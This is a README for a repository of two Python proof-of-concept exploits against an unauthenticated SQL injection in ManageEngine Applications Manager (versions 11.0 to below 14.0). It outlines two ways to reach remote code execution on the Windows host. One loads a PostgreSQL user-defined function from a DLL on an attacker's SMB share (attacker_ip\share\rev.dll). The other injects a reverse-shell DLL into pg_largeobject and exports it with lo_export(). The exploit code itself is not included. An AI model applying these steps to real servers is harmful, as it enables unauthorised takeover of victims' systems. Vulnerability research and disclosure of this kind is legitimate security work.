This repository provides two Python-based proof-of-concept (PoC) exploits targeting a critical unauthenticated SQL injection vulnerability in the AMUserResourcesSyncServlet endpoint of ManageEngine Applications Manager (versions 11.0 to <14.0). The backend database for this application is PostgreSQL, which allows the attacker to craft and load a User-Defined Function (UDF) written in C to achieve remote code execution (RCE) on the underlying Windows host.

1. POC_ManageEngine.py – UDF DLL Load via SMB

    Defines a UDF via CREATE FUNCTION ... AS $$\\attacker_ip\share\rev.dll$$

    Triggers a reverse shell by calling the function with target IP/port

    Simple and efficient for SMB-hosted DLL payloads

2. LargeObjectAPI.py – Large Object Injection & Export

    Encodes the reverse shell payload (DLL) into hex

    Injects the binary into PostgreSQL's pg_largeobject table chunk by chunk

    Uses lo_export() to drop the UDF DLL to disk on the target

    Triggers code execution via the exported UDF
